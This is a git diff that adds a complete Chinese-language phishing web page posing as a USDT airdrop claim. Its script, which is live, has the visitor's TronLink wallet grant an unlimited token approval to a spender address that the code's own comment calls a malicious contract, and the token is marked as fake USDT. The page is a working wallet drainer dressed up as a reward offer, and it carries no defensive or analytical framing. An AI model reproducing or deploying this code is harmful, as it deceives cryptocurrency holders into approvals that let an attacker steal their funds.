@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>领取 USDT 空投</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .card {
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      padding: 2rem;
+      text-align: center;
+      width: 300px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+      background-color: #27ae60;
+      color: white;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+    #status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>领取 USDT 空投</h2>
+    <p>请授权 USDT 使用权限以领取空投奖励</p>
+    <button onclick="approve()">授权 USDT</button>
+    <div id="status">钱包未连接</div>
+  </div>
+
+  <script>
+    const tokenAddress = "TEuuoTJxgCpr7HpviBr4XY496VBrdkZ13G"; // 伪USDT合约
+    const spenderAddress = "TDwzAMeJQTbYEGJzKgoma8zgSxvXwqYW6d"; // 恶意合约
+
+    async function approve() {
+      if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
+        document.getElementById("status").innerText = "请先连接 TronLink 钱包";
+        return;
+      }
+
+      document.getElementById("status").innerText = "发起授权中...";
+
+      const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 无限授权
+      const contract = await tronWeb.contract().at(tokenAddress);
+
+      try {
+        const tx = await contract.approve(spenderAddress, maxAmount).send();
+        document.getElementById("status").innerText = "授权成功，TX: " + tx;
+      } catch (e) {
+        console.error(e);
+        document.getElementById("status").innerText = "授权失败";
+      }
+    }
+
+    window.addEventListener('load', () => {
+      const checkWallet = setInterval(() => {
+        if (window.tronWeb && tronWeb.defaultAddress.base58) {
+          document.getElementById("status").innerText = "钱包已连接: " + tronWeb.defaultAddress.base58;
+          clearInterval(checkWallet);
+        }
+      }, 500);
+    });
+  </script>
+</body>
+</html>
